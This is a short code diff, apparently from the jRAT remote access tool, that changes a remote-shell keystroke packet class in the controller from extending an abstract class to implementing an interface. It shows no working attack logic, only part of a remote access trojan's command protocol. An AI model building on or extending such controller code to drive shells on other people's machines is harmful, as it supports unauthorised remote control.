@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet22RemoteShellTyped extends AbstractOutgoingPacket {
+public class Packet22RemoteShellTyped implements OutgoingPacket {
 
 	private char c;
 
